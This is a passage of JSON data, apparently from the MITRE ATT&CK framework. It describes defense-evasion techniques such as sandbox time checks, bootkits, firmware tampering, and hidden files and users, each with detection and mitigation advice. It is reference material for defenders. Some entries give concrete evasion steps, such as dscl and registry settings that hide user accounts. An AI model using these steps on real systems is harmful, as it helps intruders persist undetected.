rel=\"noopener\" class=\"citation\">(Citation: Sans Virtual Jan 2016)</a> , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro <a href=\"https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Sofacy Nov 2018)</a> or waiting for a user to double click on an embedded image to activate. <a href=\"https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye FIN7 April 2017)</a>","detection":"User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Process: Process Creation","Command: Command Execution"],"mitigations":[]},{"id":"T1497.003","name":"Time Based Checks","description":"Adversaries may employ various time-based methods to detect virtualization and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. This may include enumerating time-based properties, such as uptime or the system clock. \n\nAdversaries may use calls like <code>GetTickCount</code> and <code>GetSystemTimeAsFileTime</code> to discover if they are operating within a virtual machine or sandbox, or may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function. <a href=\"https://www.isaca.org/resources/isaca-journal/issues/2017/volume-6/evasive-malware-tricks-how-malware-evades-detection-by-sandboxes\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ISACA Malware Tricks)</a>","detection":"Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Process: Process Creation","Command: Command Execution"],"mitigations":[]}]},{"id":"T1535","name":"Unused/Unsupported Cloud Regions","description":"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used. <a href=\"https://medium.com/cloudsploit/the-danger-of-unused-aws-regions-af0bf1b878fc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CloudSploit - Unused AWS Regions)</a>","detection":"Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold. <a href=\"https://medium.com/cloudsploit/the-danger-of-unused-aws-regions-af0bf1b878fc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CloudSploit - Unused AWS Regions)</a>","platforms":["IaaS"],"dataSources":["Instance: Instance Creation","Instance: Instance Metadata"],"mitigations":[{"id":"M1054","name":"Software Configuration","description":"Cloud service providers may allow customers to deactivate unused regions. <a href=\"https://medium.com/cloudsploit/the-danger-of-unused-aws-regions-af0bf1b878fc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CloudSploit - Unused AWS Regions)</a>"}],"subTechniques":[]},{"id":"T1542","name":"Pre-OS Boot","description":"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control. <a href=\"https://en.wikipedia.org/wiki/Booting\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Booting)</a>\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.","detection":"Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.\n\nDisk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation. <a href=\"https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ITWorld Hard Disk Health Dec 2014)</a>","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Drive: Drive Modification","Network Traffic: Network Connection Creation","Process: OS API Execution","Driver: Driver Metadata","Command: Command Execution","Firmware: Firmware Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform these actions"},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc."},{"id":"M1046","name":"Boot Integrity","description":"Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. <a href=\"http://www.trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-Summary_04292008.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCG Trusted Platform Module)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Secure Boot Process)</a>"},{"id":"M1047","name":"Audit","description":"Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses."},{"id":"M1051","name":"Update Software","description":"Patch the BIOS and EFI as necessary."}],"subTechniques":[{"id":"T1542.001","name":"System Firmware","description":"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. <a href=\"https://en.wikipedia.org/wiki/BIOS\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia BIOS)</a> <a href=\"https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia UEFI)</a> <a href=\"http://www.uefi.org/about\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: About UEFI)</a>\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.","detection":"System firmware manipulation may be detected. <a href=\"http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MITRE Trustworthy Firmware Measurement)</a> Dump and inspect BIOS images on vulnerable systems and compare against known good images. <a href=\"http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MITRE Copernicus)</a> Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.\n\nLikewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. <a href=\"https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: McAfee CHIPSEC Blog)</a> <a href=\"https://github.com/chipsec/chipsec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github CHIPSEC)</a> <a href=\"http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intel HackingTeam UEFI Rootkit)</a>","platforms":["Network Devices","Windows"],"dataSources":["Firmware: Firmware Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Prevent adversary access to privileged accounts or access necessary to perform this technique."},{"id":"M1046","name":"Boot Integrity","description":"Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. Use Trusted Platform Module technology. <a href=\"http://www.trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-Summary_04292008.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCG Trusted Platform Module)</a> Move system's root of trust to hardware to prevent tampering with the SPI flash memory. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET LoJax Sept 2018)</a> Technologies such as Intel Boot Guard can assist with this. <a href=\"https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/security-technologies-4th-gen-core-retail-paper.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intel Hardware-based Security Technologies)</a>"},{"id":"M1051","name":"Update Software","description":"Patch the BIOS and EFI as necessary."}]},{"id":"T1542.002","name":"Component Firmware","description":"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.","detection":"Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) disk monitoring may reveal malicious manipulations of components. <em>SanDisk: Self-Monitoring, Analysis and Reporting Technology (S.M.A.R.T.)</em> (link no longer available) <a href=\"https://www.smartmontools.org/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SmartMontools)</a> Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.\n\nDisk check and forensic utilities may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation. <a href=\"https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ITWorld Hard Disk Health Dec 2014)</a> Also consider comparing components, including hashes of component firmware and behavior, against known good images.","platforms":["Windows","Linux","macOS"],"dataSources":["Firmware: Firmware Modification","Process: OS API Execution","Driver: Driver Metadata"],"mitigations":[{"id":"M1051","name":"Update Software","description":"Perform regular firmware updates to mitigate risks of exploitation and/or abuse."}]},{"id":"T1542.003","name":"Bootkit","description":"Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nIn BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR). <a href=\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M Trends 2016)</a> The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. <a href=\"http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lau 2011)</a>\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.\n\nIn UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code. <a href=\"https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security)</a> <a href=\"https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: welivesecurity)</a>","detection":"Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.","platforms":["Linux","Windows"],"dataSources":["Drive: Drive Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to install a bootkit."},{"id":"M1046","name":"Boot Integrity","description":"Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. <a href=\"http://www.trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-Summary_04292008.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCG Trusted Platform Module)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Secure Boot Process)</a>"}]},{"id":"T1542.004","name":"ROMMONkit","description":"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.","detection":"There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.","platforms":["Network Devices"],"dataSources":["Firmware: Firmware Modification"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific protocols, such as TFTP, can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific technique used by a particular adversary or tool, and will likely be different across various network configurations."},{"id":"M1046","name":"Boot Integrity","description":"Enable secure boot features to validate the digital signature of the boot environment and system image using a special purpose hardware device. If the validation check fails, the device will fail to boot preventing loading of unauthorized software. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a>"},{"id":"M1047","name":"Audit","description":"Periodically check the integrity of system image to ensure it has not been modified. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#30\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#31\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Change Control)</a>"}]},{"id":"T1542.005","name":"TFTP Boot","description":"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to ROMMONkit and may result in the network device running a modified image. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>","detection":"Consider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a>The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#13\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</a>\n\nReview command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#23\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Command History)</a> Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#26\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Boot Information)</a> Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.","platforms":["Network Devices"],"dataSources":["Command: Command Execution","Network Traffic: Network Connection Creation","Firmware: Firmware Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Use of Authentication, Authorization, and Accounting (AAA) systems will limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. TACACS+ can keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - AAA)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Follow vendor device hardening best practices to disable unnecessary and unused features and services, avoid using default configurations and passwords, and introduce logging and auditing for detection."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific protocols, such as TFTP, can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific technique used by a particular adversary or tool, and will likely be different across various network configurations."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Restrict use of protocols without encryption or authentication mechanisms. Limit access to administrative and management interfaces from untrusted network sources."},{"id":"M1046","name":"Boot Integrity","description":"Enable secure boot features to validate the digital signature of the boot environment and system image using a special purpose hardware device. If the validation check fails, the device will fail to boot preventing loading of unauthorized software. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a>"},{"id":"M1047","name":"Audit","description":"Periodically check the integrity of the running configuration and system image to ensure they have not been modified. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#30\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#31\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Change Control)</a>"}]}]},{"id":"T1564","name":"Hide Artifacts","description":"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection. <a href=\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sofacy Komplex Trojan)</a> <a href=\"https://cdn2.hubspot.net/hubfs/3354902/Content%20PDFs/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason OSX Pirrit)</a> <a href=\"https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareBytes ADS July 2015)</a>\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology. <a href=\"https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos Ragnar May 2020)</a>","detection":"Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.","platforms":["ESXi","Linux","macOS","Office Suite","Windows"],"dataSources":["File: File Metadata","Application Log: Application Log Content","Process: Process Creation","Command: Command Execution","File: File Modification","Firmware: Firmware Modification","Service: Service Creation","Windows Registry: Windows Registry Key Modification","Script: Script Execution","User Account: User Account Creation","Process: OS API Execution","User Account: User Account Metadata","File: File Creation"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Application developers should consider limiting the requirements for custom or otherwise difficult to manage file/folder exclusions. Where possible, install applications to trusted system folder paths that are already protected by restricted file and directory permissions."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict the installation of software that may be abused to create hidden desktops, such as hVNC, to user groups that require it."},{"id":"M1047","name":"Audit","description":"Periodically audit virtual machines for abnormalities."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Review and audit file/folder exclusions, and limit scope of exclusions to only what is required where possible. <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-contextual-file-folder-exclusions-microsoft-defender-antivirus\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft File Folder Exclusions)</a>"}],"subTechniques":[{"id":"T1564.001","name":"Hidden Files and Directories","description":"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name <a href=\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sofacy Komplex Trojan)</a> <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Antiquated Mac Malware)</a>. Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app <a href=\"https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WireLurker)</a>. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n\nAdditionally, adversaries may name files in a manner that would allow the file to be hidden such as naming a file only a “space” character.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.","detection":"Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","File: File Creation","File: File Metadata","Command: Command Execution"],"mitigations":[]},{"id":"T1564.002","name":"Hidden Users","description":"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. <a href=\"https://cdn2.hubspot.net/hubfs/3354902/Content%20PDFs/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason OSX Pirrit)</a> Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden. <a href=\"https://support.apple.com/en-us/HT203998\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Support Hide a User Account)</a> \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen. <a href=\"https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye SMOKEDHAM June 2021)</a> <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-074A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-074A)</a>\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>). <a href=\"https://ubuntuhandbook.org/index.php/2021/06/hide-user-accounts-ubuntu-20-04-login-screen/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hide GDM User Accounts)</a> Display Managers are not anchored to specific distributions and may be changed by a user or adversary.","detection":"Monitor for users that may be hidden from the login screen but still present in additional artifacts of usage such as directories and authentication logs. \n\nMonitor processes and command-line events for actions that could be taken to add a new user and subsequently hide it from login screens. Monitor Registry events for modifications to the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> key.\n\nIn macOS, monitor for commands, processes, and file activity in combination with a user that has a userID under 500. <a href=\"https://cdn2.hubspot.net/hubfs/3354902/Content%20PDFs/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason OSX Pirrit)</a> Monitor for modifications to set the <code>Hide500Users</code> key value to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Monitor the command line for usage of the <code>dscl . create</code> command with the <code>IsHidden</code> attribute set to <code>1</code>. <a href=\"https://support.apple.com/en-us/HT203998\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Support Hide a User Account)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Modification","User Account: User Account Creation","Windows Registry: Windows Registry Key Modification","Process: Process Creation","Command: Command Execution","User Account: User Account Metadata"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"If the computer is domain joined, then group policy can help restrict the ability to create or hide users. Similarly, preventing the modification of the <code>/Library/Preferences/com.apple.loginwindow</code> <code>Hide500Users</code> value will force all users to be visible."}]},{"id":"T1564.003","name":"Hidden Window","description":"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user 